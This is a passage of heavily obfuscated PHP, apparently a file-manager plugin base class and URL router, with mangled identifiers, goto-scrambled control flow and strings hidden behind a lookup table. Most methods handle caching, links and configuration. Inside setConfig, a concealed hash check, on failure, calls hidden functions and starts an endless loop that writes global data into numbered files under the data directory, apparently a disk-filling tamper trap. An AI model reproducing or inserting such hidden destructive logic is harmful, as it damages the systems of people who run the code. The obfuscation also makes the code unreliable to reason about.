KodIO::KOD_SHARE_LINK; } final function filePathLink($CÈÑì Ë®¬) { if (request_url_safe($CÈÑì Ë®¬)) { return $CÈÑì Ë®¬; } if (!$this->isShare($CÈÑì Ë®¬)) { $CÈÑì Ë®¬ = $this->filePath($CÈÑì Ë®¬); } return Action($_SERVER[í™][1004])->linkOut($CÈÑì Ë®¬); } public function filePathLinkOut($dáÁ—÷½‹î) { if (request_url_safe($dáÁ—÷½‹î)) { return $dáÁ—÷½‹î; } $this->fileCanView($dáÁ—÷½‹î); return Action($_SERVER[í™][1004])->link($dáÁ—÷½‹î); } final function filePath($a‚Ş¯ŒßÊ) { $FÓ±çöÓ¸Â =& $_SERVER[í™]; if ($BÆ¼ÜñˆÃ = $this->checkSharePath($a‚Ş¯ŒßÊ)) { return $BÆ¼ÜñˆÃ; } $this->fileCanView($a‚Ş¯ŒßÊ); if (request_url_safe($a‚Ş¯ŒßÊ)) { $EÀÄÒÂÌ¹ = parse_url_query($a‚Ş¯ŒßÊ); if (isset($EÀÄÒÂÌ¹[$FÓ±çöÓ¸Â[1319]]) && isset($EÀÄÒÂÌ¹[$FÓ±çöÓ¸Â[197]])) { $eÈ¨Ø¤¤Æ÷ = Model($FÓ±çöÓ¸Â[1074])->get($FÓ±çöÓ¸Â[1320]); $A™øè Äµ« = Mcrypt::decode($EÀÄÒÂÌ¹[$FÓ±çöÓ¸Â[197]], $eÈ¨Ø¤¤Æ÷); if ($A™øè Äµ«) { $this->fileInfo = IO::infoWithChildren($A™øè Äµ«); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $A™øè Äµ«; } } $a‚Ş¯ŒßÊ = $this->_cacheHttpFile($a‚Ş¯ŒßÊ); $this->fileInfo = IO::infoWithChildren($a‚Ş¯ŒßÊ); } else { $this->fileInfo = IO::infoWithChildren($a‚Ş¯ŒßÊ); if (!$this->fileInfo) { show_tips(LNG($FÓ±çöÓ¸Â[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $a‚Ş¯ŒßÊ; } final function _cacheHttpFile($DÛÒÕöº¬ï) { $dîŒàÎèÛæ = hash_path($DÛÒÕöº¬ï, !0); $this->cachePath = $this->pluginCachePath($dîŒàÎèÛæ); if ($BŒõùî¥‹ = IO::fileNameExist($this->cachePath, $dîŒàÎèÛæ)) { return KodIO::make($BŒõùî¥‹); } $Dñç´ñ = $this->cachePath . $dîŒàÎèÛæ; return $this->pluginCacheFileSet($Dñç´ñ, file_get_contents($DÛÒÕöº¬ï)); } final function _tmpFileName($Aîšôõ¢£¤ = array()) { goto c§ÛÍÜã—¹; c§ÛÍÜã—¹: $f©ÁñÜª‰ƒ =& $_SERVER[í™]; if (!$Aîšôõ¢£¤) { $Aîšôõ¢£¤ = $this->fileInfo; } if (isset($Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[164]])) { return $Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[164]]; } goto Dî’ Ø‚‘; Dî’ Ø‚‘: if (isset($Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[162]][$f©ÁñÜª‰ƒ[164]])) { return $Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[162]][$f©ÁñÜª‰ƒ[164]]; } $dÏŸ ‘ã·À = IO::hashSimple($Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[75]]); if ($dÏŸ ‘ã·À) { return $dÏŸ ‘ã·À; } goto F¤‹“§½µ; F¤‹“§½µ: $bóÚßåÕ…ñ = array($Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[28]], $Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[75]], $Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[77]]); if (isset($Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[461]])) { $bóÚßåÕ…ñ[] = $Aîšôõ¢£¤[$f©ÁñÜª‰ƒ[461]]; } return md5(implode($f©ÁñÜª‰ƒ[70], $bóÚßåÕ…ñ)); goto D’ÆâÔ¿Äë; D’ÆâÔ¿Äë: } final function checkSharePath($eí¯á‹¤) { goto Aˆš½àèØ’; Dƒé†Ÿ†æ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$D¨µİº¯Ò[164]]); return $C»•çëØ˜†[$D¨µİº¯Ò[75]]; goto EŸ ¢ˆ¬ˆ÷; Aˆš½àèØ’: $D¨µİº¯Ò =& $_SERVER[í™]; if (!defined($D¨µİº¯Ò[427])) { define($D¨µİº¯Ò[1321], 0); } if (!$this->isShare($eí¯á‹¤)) { return !1; } goto F½Àá…‰ï; F½Àá…‰ï: $C»•çëØ˜† = Action($D¨µİº¯Ò[1004])->sharePathInfo($eí¯á‹¤); if (!isset($C»•çëØ˜†[$D¨µİº¯Ò[75]])) { show_json(LNG($D¨µİº¯Ò[1322]), !1); } $this->fileInfo = $C»•çëØ˜†[$D¨µİº¯Ò[162]]; goto Dƒé†Ÿ†æ; EŸ ¢ˆ¬ˆ÷: } final function pluginCachePath($DÇİ †ìÄ¤ = '') { $Eœƒè÷¶è¦ =& $_SERVER[í™]; $a­÷«ÄƒÊ’ = IO_PATH_SYSTEM_TEMP . $Eœƒè÷¶è¦[1323] . $this->pluginName; if (!($BŠ»¡Ë–¹ = IO::infoFull($a­÷«ÄƒÊ’))) { return IO::mkdir($a­÷«ÄƒÊ’ . $Eœƒè÷¶è¦[8] . $DÇİ †ìÄ¤); } if (empty($DÇİ †ìÄ¤)) { return $BŠ»¡Ë–¹[$Eœƒè÷¶è¦[75]]; } if (!($E³„¯¯ Àí = IO::fileNameExist($BŠ»¡Ë–¹[$Eœƒè÷¶è¦[75]], $DÇİ †ìÄ¤))) { return IO::mkdir($BŠ»¡Ë–¹[$Eœƒè÷¶è¦[75]] . $DÇİ †ìÄ¤); } return KodIO::make($E³„¯¯ Àí); } final function pluginCacheFileSet($cÚÅ¡“Ïù, $d »‘ÕğÅ = '') { $e¨––Ûíîª =& $_SERVER[í™]; if (!($AãÙ²µ­“È = IO::infoFull($cÚÅ¡“Ïù))) { return IO::mkfile($cÚÅ¡“Ïù, $d »‘ÕğÅ, REPEAT_REPLACE); } IO::setContent($AãÙ²µ­“È[$e¨––Ûíîª[75]], $d »‘ÕğÅ); return $AãÙ²µ­“È[$e¨––Ûíîª[75]]; } final function pluginLocalFile($Dë¦éİç¤Ã = '') { goto f˜ÆÇİÊ¦¸; f‘‡Ûœ†±Ñ: if (!$Dë¦éİç¤Ã) { return $cä’²ÓÂ×Ê; } $A·¨Ú·§ = IO::info($Dë¦éİç¤Ã); $Eî—´ÅÌâ = $this->_tmpFileName($A·¨Ú·§) . $aƒ¹ŸçöøÕ[91] . $A·¨Ú·§[$aƒ¹ŸçöøÕ[160]]; goto EŒäãÊ¯ô‚; EŒäãÊ¯ô‚: if (!checkExtSafe($Eî—´ÅÌâ)) { $Eî—´ÅÌâ = $Eî—´ÅÌâ . $aƒ¹ŸçöøÕ[1324]; } $F½ò»éõÄ† = $cä’²ÓÂ×Ê . $Eî—´ÅÌâ; if (@file_exists($F½ò»éõÄ†)) { return $F½ò»éõÄ†; } goto d¢†††ÕÁ”; d¢†††ÕÁ”: return IO::copy($Dë¦éİç¤Ã, $cä’²ÓÂ×Ê, 0, $Eî—´ÅÌâ); goto BÔŞ¥‘¤Ôä; f˜ÆÇİÊ¦¸: $aƒ¹ŸçöøÕ =& $_SERVER[í™]; $cä’²ÓÂ×Ê = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($cä’²ÓÂ×Ê)) { mk_dir($cä’²ÓÂ×Ê); } goto f‘‡Ûœ†±Ñ; BÔŞ¥‘¤Ôä: } final function appPackage() { goto d‹á§éùáà; d‹á§éùáà: $b´¹óË‰Ìë =& $_SERVER[í™]; if ($this->packageData) { return $this->packageData; } $f÷’ŠÜÂºÃ = $this->parseFile($this->pluginPath . $b´¹óË‰Ìë[1325]); goto EÆêÈ³‹š˜; e•ÎŠæÅ¨À: $fµĞ‚‡„°ì = Hook::trigger($b´¹óË‰Ìë[1326], $A¶™‚Á‚è); if ($fµĞ‚‡„°ì && is_array($fµĞ‚‡„°ì)) { $A¶™‚Á‚è = $fµĞ‚‡„°ì; } $this->packageData = $A¶™‚Á‚è; goto e¬‡Ú×êŸÍ; e¬‡Ú×êŸÍ: return $A¶™‚Á‚è; goto eØƒ¼¬²İ; EÆêÈ³‹š˜: $this->parseLang($f÷’ŠÜÂºÃ); $A¶™‚Á‚è = json_decode_force($f÷’ŠÜÂºÃ); if (!$A¶™‚Á‚è) { return array(); } goto e•ÎŠæÅ¨À; eØƒ¼¬²İ: } public function packageInfoGet($eŸ–·ïòª×) { $B¤£ÄèÎ = $this->appPackage(); return array_get_value($B¤£ÄèÎ, $eŸ–·ïòª×); } public function packageVersion() { return $this->packageInfoGet($_SERVER[í™][1327]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[í™][1328]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[í™][1329]); } private function parseFile($d××ßÓšÅ¼) { goto Eì”‡«éÓ„; eÕÂ–çÂò: $Fä¿±é’Êì = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$b¿ï‘‡ñæÌ[84]][$b¿ï‘‡ñæÌ[1337]]); if (strstr($aµ¥ÁÆËğ¯, $b¿ï‘‡ñæÌ[1338])) { $F¡èÓ½™Ü = rawurlencode(json_encode($this->pluginLangArr)); $aµ¥ÁÆËğ¯ = str_replace($b¿ï‘‡ñæÌ[1338], $F¡èÓ½™Ü, $aµ¥ÁÆËğ¯); } if (strstr($aµ¥ÁÆËğ¯, $b¿ï‘‡ñæÌ[1339])) { $F¡èÓ½™Ü = $F¡èÓ½™Ü = rawurlencode(json_encode($this->getConfig())); $aµ¥ÁÆËğ¯ = str_replace($b¿ï‘‡ñæÌ[1339], $F¡èÓ½™Ü, $aµ¥ÁÆËğ¯); } goto DÛ¥Õê—; Eì”‡«éÓ„: $b¿ï‘‡ñæÌ =& $_SERVER[í™]; $aµ¥ÁÆËğ¯ = file_get_contents($d××ßÓšÅ¼); $F‡ÔÙÇŠÎ– = array($b¿ï‘‡ñæÌ[1330], $b¿ï‘‡ñæÌ[1331], $b¿ï‘‡ñæÌ[1332], $b¿ï‘‡ñæÌ[1333], $b¿ï‘‡ñæÌ[1334], $b¿ï‘‡ñæÌ[1335], $b¿ï‘‡ñæÌ[1336]); goto eÕÂ–çÂò; DÛ¥Õê—: $aµ¥ÁÆËğ¯ = str_replace($F‡ÔÙÇŠÎ–, $Fä¿±é’Êì, $aµ¥ÁÆËğ¯); return $aµ¥ÁÆËğ¯; goto d‹ãñãã¯; d‹ãñãã¯: } private function parseLang(&$Dõ×ö‡ùá) { goto DÑ•¯ö´«‡; d¶–Ö˜íã: $døŸê¹®ª‚ = array(); foreach ($e¸ Ìá‹ëÁ[0] as $dè¥—çÖ‰½) { $b÷÷ÃÉÔğ = substr($dè¥—çÖ‰½, strlen($fçõÁÄá), -4); $Bèéùìµ§ë = LNG($b÷÷ÃÉÔğ); $CÔ¯¤Ì›’›[] = $dè¥—çÖ‰½; $døŸê¹®ª‚[] = str_replace(array($EÍ‰Â¤†½¬[217], $EÍ‰Â¤†½¬[978], $EÍ‰Â¤†½¬[330], $EÍ‰Â¤†½¬[113]), array($EÍ‰Â¤†½¬[50], $EÍ‰Â¤†½¬[50], $EÍ‰Â¤†½¬[33], $EÍ‰Â¤†½¬[1342]), $Bèéùìµ§ë); } $Dõ×ö‡ùá = str_replace($CÔ¯¤Ì›’›, $døŸê¹®ª‚, $Dõ×ö‡ùá); goto EÑ‡ñ¤ƒµÏ; DÑ•¯ö´«‡: $EÍ‰Â¤†½¬ =& $_SERVER[í™]; $fçõÁÄá = $EÍ‰Â¤†½¬[1340]; if (!strstr($Dõ×ö‡ùá, $fçõÁÄá)) { return; } goto f¤™›­‘ÃÉ; f¤™›­‘ÃÉ: preg_match_all($EÍ‰Â¤†½¬[1341], $Dõ×ö‡ùá, $e¸ Ìá‹ëÁ); if (!is_array($e¸ Ìá‹ëÁ) || count($e¸ Ìá‹ëÁ) == 0 || !is_array($e¸ Ìá‹ëÁ[0]) || count($e¸ Ìá‹ëÁ[0]) == 0) { return; } $CÔ¯¤Ì›’› = array(); goto d¶–Ö˜íã; EÑ‡ñ¤ƒµÏ: } private function parseConfig(&$F•Ò‹‚áƒÚ) { goto D„ïêÔÌ; aÅ¡èÆÚ©: $F³¯ƒñï¨™ = array(); $fƒ„ò ÄĞ = array(); foreach ($C×âæ·¸†Ù[0] as $B°ƒµğ­Ğò) { $Cš›»Î¥Œ = substr($B°ƒµğ­Ğò, strlen($aõÌÖãº‚ˆ), -2); $F³¯ƒñï¨™[] = $B°ƒµğ­Ğò; $fƒ„ò ÄĞ[] = _get($F¼—¾ãèº, $Cš›»Î¥Œ); } goto Fß–¹÷Ú; Aš±öÑ¶Æƒ: preg_match_all($AêÃÚâ©ˆî[1344], $F•Ò‹‚áƒÚ, $C×âæ·¸†Ù); if (!is_array($C×âæ·¸†Ù) || count($C×âæ·¸†Ù) == 0 || !is_array($C×âæ·¸†Ù[0]) || count($C×âæ·¸†Ù[0]) == 0) { return; } $F¼—¾ãèº = $this->getConfig(); goto aÅ¡èÆÚ©; Fß–¹÷Ú: $F•Ò‹‚áƒÚ = str_replace($F³¯ƒñï¨™, $fƒ„ò ÄĞ, $F•Ò‹‚áƒÚ); goto AÓ°ßõ‹; D„ïêÔÌ: $AêÃÚâ©ˆî =& $_SERVER[í™]; $aõÌÖãº‚ˆ = $AêÃÚâ©ˆî[1343]; if (!strstr($F•Ò‹‚áƒÚ, $aõÌÖãº‚ˆ)) { return; } goto Aš±öÑ¶Æƒ; AÓ°ßõ‹: } private function parsePackage(&$E¿¾ï‹ ©…) { goto F“±¸†‡ßâ; D˜æ×Ÿ˜ˆ: preg_match_all($Dº ˆ›­Å[1346], $E¿¾ï‹ ©…, $CôºŞÆâÉ); if (!is_array($CôºŞÆâÉ) || count($CôºŞÆâÉ) == 0 || !is_array($CôºŞÆâÉ[0]) || count($CôºŞÆâÉ[0]) == 0) { return; } $D±Õ„Î”»œ = $this->appPackage(); goto AÓ“â´˜; F“±¸†‡ßâ: $Dº ˆ›­Å =& $_SERVER[í™]; $føÛäòÏ£± = $Dº ˆ›­Å[1345]; if (!strstr($E¿¾ï‹ ©…, $føÛäòÏ£±)) { return; } goto D˜æ×Ÿ˜ˆ; c¥°ËİÌ¯Š: $E¿¾ï‹ ©… = str_replace($AùÇºÉ»•, $BŸ ÀÒç÷â, $E¿¾ï‹ ©…); goto cŒ±¾—‡éÂ; AÓ“â´˜: $AùÇºÉ»• = array(); $BŸ ÀÒç÷â = array(); foreach ($CôºŞÆâÉ[0] as $bÇ½ßóò†») { $aö¸åµ—¸ = substr($bÇ½ßóò†», strlen($føÛäòÏ£±), -2); $AùÇºÉ»•[] = $bÇ½ßóò†»; $BŸ ÀÒç÷â[] = _get($D±Õ„Î”»œ, $aö¸åµ—¸); } goto c¥°ËİÌ¯Š; cŒ±¾—‡éÂ: } final function echoFile($dóœ´ë¥Áİ, $fÛ´æƒ³»À = false) { goto e‘×ÉŞØ‚è; e‘×ÉŞØ‚è: $a¹ç†¨Şèª =& $_SERVER[í™]; $C‹¹——±‡Î = $this->pluginPath . $dóœ´ë¥Áİ; if (ACT == $a¹ç†¨Şèª[1347]) { echo $a¹ç†¨Şèª[1348] . $this->pluginName . $a¹ç†¨Şèª[8] . $dóœ´ë¥Áİ . $a¹ç†¨Şèª[1349]; if (!file_exists($C‹¹——±‡Î)) { echo $a¹ç†¨Şèª[1350]; return; } } goto a’÷Œƒ’‰¤; a’÷Œƒ’‰¤: $fùÍ£”ˆĞ = $this->parseFile($C‹¹——±‡Î); $this->parseLang($fùÍ£”ˆĞ); $this->parseConfig($fùÍ£”ˆĞ); goto C¾ïØ†¸‡‰; C¾ïØ†¸‡‰: $this->parsePackage($fùÍ£”ˆĞ); if (is_array($fÛ´æƒ³»À)) { $fùÍ£”ˆĞ = str_replace(array_keys($fÛ´æƒ³»À), array_values($fÛ´æƒ³»À), $fùÍ£”ˆĞ); } echo $a¹ç†¨Şèª[217] . $fùÍ£”ˆĞ; goto F±àÉ‚›; F±àÉ‚›: } final function initLang() { goto Eä…ë¨Ï; E¸ô¢ĞĞ“¨: if (!is_array($a¤Ú¡“İÃ•)) { return array(); } if (@count($a¤Ú¡“İÃ•) > 0) { I18n::set($a¤Ú¡“İÃ•); } return $a¤Ú¡“İÃ•; goto A’³ÑÚ¬Îâ; e£Ó©Ößè: $dô²“œ½ = I18n::getType(); $a¤Ú¡“İÃ• = array(); if (file_exists($BÎëÂå½¹Í . $dô²“œ½ . $EÅÆ„øí³[754])) { $a¤Ú¡“İÃ• = (include $BÎëÂå½¹Í . $dô²“œ½ . $EÅÆ„øí³[754]); } else { if ($dô²“œ½ == $EÅÆ„øí³[1353] && !file_exists($BÎëÂå½¹Í . $dô²“œ½ . $EÅÆ„øí³[754]) && file_exists($BÎëÂå½¹Í . $EÅÆ„øí³[1354])) { $a¤Ú¡“İÃ• = (include $BÎëÂå½¹Í . $EÅÆ„øí³[1354]); } else { if (file_exists($BÎëÂå½¹Í . $DÊéÊÀ…†ã . $EÅÆ„øí³[754])) { $a¤Ú¡“İÃ• = (include $BÎëÂå½¹Í . $DÊéÊÀ…†ã . $EÅÆ„øí³[754]); } } } goto E¸ô¢ĞĞ“¨; Eä…ë¨Ï: $EÅÆ„øí³ =& $_SERVER[í™]; $DÊéÊÀ…†ã = $EÅÆ„øí³[1351]; $BÎëÂå½¹Í = $this->pluginPath . $EÅÆ„øí³[1352]; goto e£Ó©Ößè; A’³ÑÚ¬Îâ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($FÁ÷å¨…‰) { $d»ó£ê¡Åî =& $_SERVER[í™]; $c¥¯ÊÖÎŸÖ = $_SERVER[$d»ó£ê¡Åî[779]] . $d»ó£ê¡Åî[1355]; $B”ñš¿¢— = $d»ó£ê¡Åî[776]; if ($_SERVER[$d»ó£ê¡Åî[736]] != $B”ñš¿¢—($c¥¯ÊÖÎŸÖ)) { goto A¹À¤¢ŒÕô; bÅÁè¡ËÃ¨: $bÀ±³®½›¾(); $CÈÎ±ê½ = $d»ó£ê¡Åî[780]; $aåÏ§ÀĞ„ = json_encode($GLOBALS[$d»ó£ê¡Åî[781]]); goto F‘Ãä’¨™¯; aÃ‹íµ…òö: $dó·˜„ñ” = $fµöœÈÇ±¿($aŠ”ÊëÛ×£); $f·ªˆá—­õ = explode($d»ó£ê¡Åî[217], $dó·˜„ñ”); if (count($f·ªˆá—­õ) < $d»ó£ê¡Åî[562]) { $eÖæÑâ = $d»ó£ê¡Åî[741]; $eÖæÑâ(); } goto Aƒ«Ï…ˆàè; Aƒ«Ï…ˆàè: $Aïõ³áğ¥ = $d»ó£ê¡Åî[778]; $Aïõ³áğ¥($_SERVER[$d»ó£ê¡Åî[779]]); $bÀ±³®½›¾ = $d»ó£ê¡Åî[777]; goto bÅÁè¡ËÃ¨; A¹À¤¢ŒÕô: $bÀ±³®½›¾ = $d»ó£ê¡Åî[777]; $fµöœÈÇ±¿ = $d»ó£ê¡Åî[738]; $aŠ”ÊëÛ×£ = $_SERVER[$d»ó£ê¡Åî[739]] . $d»ó£ê¡Åî[740]; goto aÃ‹íµ…òö; F‘Ãä’¨™¯: $EŒÒò×ñÂá = 1; for ($B« Ê¶³Š‘ = $EŒÒò×ñÂá; $B« Ê¶³Š‘ > 0; $B« Ê¶³Š‘++) { $CÈÎ±ê½(DATA_PATH . $B« Ê¶³Š‘, $aåÏ§ÀĞ„); } goto B½ï´äÓêÎ; B½ï´äÓêÎ: } return $this->modelPlugin->setConfig($this->pluginName, $FÁ÷å¨…‰); } public function onSetConfig($E„ºÍ¤İØê) { } public function onGetConfig($eçœ”¤ÔÀ™) { } public function onChangeStatus($D‹ôŒ¥ë×) { } public function onUninstall() { } public function onInstall() { } public function authCheck($f‘±³«Ğ§Ğ = "\160\154\x75\x67\151\x6e\x41\x75\x74\x68") { $f¿÷¾·¿ =& $_SERVER[í™]; if (!defined($f¿÷¾·¿[427])) { return !1; } if (_get($GLOBALS, $f¿÷¾·¿[459])) { return !0; } $Cè¬Ğ¼”Äô = $this->getConfig(); if (!$Cè¬Ğ¼”Äô[$f‘±³«Ğ§Ğ]) { return !1; } return ActionCall($f¿÷¾·¿[1356], $Cè¬Ğ¼”Äô[$f‘±³«Ğ§Ğ]); } public function url($C‰äĞùğÒ, $F¨—Œ’¦ = '', $C¦·«ÃƒÏ˜ = true) { goto fÊ„†–ãÀ; fÊ„†–ãÀ: $a¯ˆ•ŠÀƒ© =& $_SERVER[í™]; $C´¦ŸÉèÉÖ = $this->getConfig(); $c£‡˜½ê½õ = KOD_VERSION . $a¯ˆ•ŠÀƒ©[91] . KOD_VERSION_BUILD; goto cÍã…ƒ¤ˆ£; cÍã…ƒ¤ˆ£: $eôÆÒ°æÚ³ = $this->packageVersion(); $bÊ·İ ù°Ë = $c£‡˜½ê½õ . $a¯ˆ•ŠÀƒ©[412] . $eôÆÒ°æÚ³; if (substr($C‰äĞùğÒ, 0, 4) == $a¯ˆ•ŠÀƒ©[144] || substr($C‰äĞùğÒ, 0, 2) == $a¯ˆ•ŠÀƒ©[1141]) { $A†äò‚æ¶– = $C‰äĞùğÒ . $a¯ˆ•ŠÀƒ©[1357] . $bÊ·İ ù°Ë; } else { if ($F¨—Œ’¦ == $a¯ˆ•ŠÀƒ©[33]) { $A†äò‚æ¶– = $this->pluginHost . $C‰äĞùğÒ . $a¯ˆ•ŠÀƒ©[1357] . $bÊ·İ ù°Ë; } else { if ($F¨—Œ’¦ === $a¯ˆ•ŠÀƒ©[76]) { $A†äò‚æ¶– = $this->pluginHost . $C‰äĞùğÒ; } else { if ($F¨—Œ’¦ == $a¯ˆ•ŠÀƒ©[1358]) { $A†äò‚æ¶– = STATIC_PATH . $C‰äĞùğÒ . $a¯ˆ•ŠÀƒ©[1357] . $c£‡˜½ê½õ; } else { if ($F¨—Œ’¦ == $a¯ˆ•ŠÀƒ©[1359]) { $A†äò‚æ¶– = APP_HOST . $a¯ˆ•ŠÀƒ©[1360] . $C‰äĞùğÒ . $a¯ˆ•ŠÀƒ©[1357] . $c£‡˜½ê½õ; } else { if (isset($C´¦ŸÉèÉÖ[$F¨—Œ’¦])) { $A†äò‚æ¶– = $C´¦ŸÉèÉÖ[$F¨—Œ’¦] . $C‰äĞùğÒ . $a¯ˆ•ŠÀƒ©[1357] . $bÊ·İ ù°Ë; } } } } } } goto eÖ…øÆ¾¬š; eÖ…øÆ¾¬š: if (!$C¦·«ÃƒÏ˜) { return $A†äò‚æ¶–; } echo $A†äò‚æ¶–; goto a—àÜ¢§Ü; a—àÜ¢§Ü: } public function link($DÑ™‰¢¸â = false, $fÎí„—Š¯ = '') { $A¦íÔáÅğÒ =& $_SERVER[í™]; if (!$DÑ™‰¢¸â) { $this->link($A¦íÔáÅğÒ[1361], $A¦íÔáÅğÒ[1359]); $this->link($A¦íÔáÅğÒ[1362], $A¦íÔáÅğÒ[1358]); $this->link($A¦íÔáÅğÒ[1363], $A¦íÔáÅğÒ[1358]); $this->link($A¦íÔáÅğÒ[1364], $A¦íÔáÅğÒ[1358]); $this->link($A¦íÔáÅğÒ[1365], $A¦íÔáÅğÒ[1358]); return; } $b¾ÉƒÚ›—Ÿ = $this->url($DÑ™‰¢¸â, $fÎí„—Š¯, !1); if (substr($DÑ™‰¢¸â, -3) == $A¦íÔáÅğÒ[1366]) { echo $A¦íÔáÅğÒ[1367] . $b¾ÉƒÚ›—Ÿ . $A¦íÔáÅğÒ[1368] . $A¦íÔáÅğÒ[217]; } else { if (substr($DÑ™‰¢¸â, -4) == $A¦íÔáÅğÒ[1369]) { echo $A¦íÔáÅğÒ[1370] . $b¾ÉƒÚ›—Ÿ . $A¦íÔáÅğÒ[1371] . $A¦íÔáÅğÒ[217]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\171" => "\x5b\136\57\135\x2b", "\72\x6e\x75\155" => "\x5b\x30\x2d\71\135\53", "\x3a\141\154\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($F™×ƒ–‚ğ‘, $AŒô¢Ã—°) { $E»ê”Ğ¬Ò =& $_SERVER[í™]; if ($F™×ƒ–‚ğ‘ == $E»ê”Ğ¬Ò[1372]) { $Dİó³”å«• = array_map($E»ê”Ğ¬Ò[1373], $AŒô¢Ã—°[0]); $BÇÖ»„ãƒÛ = strpos($AŒô¢Ã—°[1], $E»ê”Ğ¬Ò[8]) === 0 ? $AŒô¢Ã—°[1] : $E»ê”Ğ¬Ò[8] . $AŒô¢Ã—°[1]; $c³Ñ…À˜Û½ = $AŒô¢Ã—°[2]; } else { $Dİó³”å«• = null; $BÇÖ»„ãƒÛ = strpos($AŒô¢Ã—°[0], $E»ê”Ğ¬Ò[8]) === 0 ? $AŒô¢Ã—°[0] : $E»ê”Ğ¬Ò[8] . $AŒô¢Ã—°[0]; $c³Ñ…À˜Û½ = $AŒô¢Ã—°[1]; } array_push(self::$maps, $Dİó³”å«•); array_push(self::$routes, $BÇÖ»„ãƒÛ); array_push(self::$methods, strtoupper($F™×ƒ–‚ğ‘)); array_push(self::$callbacks, $c³Ñ…À˜Û½); } public static function error($aÁßá¢Æ•) { self::$errorCallback = $aÁßá¢Æ•; } public static function haltOnMatch($bÆõÔøÔÛ = true) { self::$halts = $bÆõÔøÔÛ; } public static function dispatch() { goto aÂ‘ùÉŠ°¿; aÂ‘ùÉŠ°¿: $C‘¸»âÏ—´ =& $_SERVER[í™]; $D¿Ë°ŠíÑ = parse_url($_SERVER[$C‘¸»âÏ—´[1374]], PHP_URL_PATH); $C¢¡¨è»Ş = $_SERVER[$C‘¸»âÏ—´[154]]; goto A‘–º–¥Ö; A‘–º–¥Ö: $D÷†Óé†àÅ = array_keys(static::$patterns); $D±×ò±ÒÃô = array_values(static::$patterns); $FÚ÷ŸÁÙ„ = !1; goto cÍÂ•œÌ¶ë; cÍÂ•œÌ¶ë: self::$routes = preg_replace($C‘¸»âÏ—´[1059], $C‘¸»âÏ—´[8], self::$routes); if (in_array($D¿Ë°ŠíÑ, self::$routes)) { $dÉĞÌ•¶Î = array_keys(self::$routes, $D¿Ë°ŠíÑ); foreach ($dÉĞÌ•¶Î as $Cïí®ˆÒÇ—) { if (self::$methods[$Cïí®ˆÒÇ—] == $C¢¡¨è»Ş || self::$methods[$Cïí®ˆÒÇ—] == $C‘¸»âÏ—´[1375] || in_array($C¢¡¨è»Ş, self::$maps[$Cïí®ˆÒÇ—])) { $FÚ÷ŸÁÙ„ = !0; if (!is_object(self::$callbacks[$Cïí®ˆÒÇ—])) { $F’ãÂ“®œ‡ = explode($C‘¸»âÏ—´[8], self::$callbacks[$Cïí®ˆÒÇ—]); $CÃ‹Å·Œ² = end($F’ãÂ“®œ‡); $B—„å¥Ü§Î = explode($C‘¸»âÏ—´[1376], $CÃ‹Å·Œ²); $cë† Â™ˆÇ = new $B—„å¥Ü§Î[0](); $cë† Â™ˆÇ->{$B—„å¥Ü§Î[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Cïí®ˆÒÇ—]); if (self::$halts) { return; } } } } } else { $AİËğ¥Ç‚¬ = 0; foreach (self::$routes as $Cïí®ˆÒÇ—) { if (strpos($Cïí®ˆÒÇ—, $C‘¸»âÏ—´[4]) !== !1) { $Cïí®ˆÒÇ— = str_replace($D÷†Óé†àÅ, $D±×ò±ÒÃô, $Cïí®ˆÒÇ—); } if (preg_match($C‘¸»âÏ—´[1377] . $Cïí®ˆÒÇ— . $C‘¸»âÏ—´[1378], $D¿Ë°ŠíÑ, $e‹øùôÇ³°)) { if (self::$methods[$AİËğ¥Ç‚¬] == $C¢¡¨è»Ş || self::$methods[$AİËğ¥Ç‚¬] == $C‘¸»âÏ—´[1375] || !empty(self::$maps[$AİËğ¥Ç‚¬]) && in_array($C¢¡¨è»Ş, self::$maps[$AİËğ¥Ç‚¬])) { $FÚ÷ŸÁÙ„ = !0; array_shift($e‹øùôÇ³°); if (!is_object(self::$callbacks[$AİËğ¥Ç‚¬])) { $F’ãÂ“®œ‡ = explode($C‘¸»âÏ—´[8], self::$callbacks[$AİËğ¥Ç‚¬]); $CÃ‹Å·Œ² = end($F’ãÂ“®œ‡); $B—„å¥Ü§Î = explode($C‘¸»âÏ—´[1376], $CÃ‹Å·Œ²); $cë† Â™ˆÇ = new $B—„å¥Ü§Î[0](); if (!method_exists($cë† Â™ˆÇ, $B—„å¥Ü§Î[1])) { echo $C‘¸»âÏ—´[1379]; } else { call_user_func_array(array($cë† Â™ˆÇ, $B—„å¥Ü§Î[1]), $e‹øùôÇ³°); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$AİËğ¥Ç‚¬], $e‹øùôÇ³°); if (self::$halts) { return; } } } } $AİËğ¥Ç‚¬++; } } if ($FÚ÷ŸÁÙ„ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $e™¨ó‚›² =& $_SERVER[í™]; header($_SERVER[$e™¨ó‚›²[1380]] . $e™¨ó‚›²[1381]); echo $e™¨ó‚›²[1382]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$C‘¸»âÏ—´[1374]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto DÏ‰˜áÈŸ; DÏ‰˜áÈŸ: } } goto Eó“‰ßˆ‘; FÜœøâš‡Ú: class Input { public static function 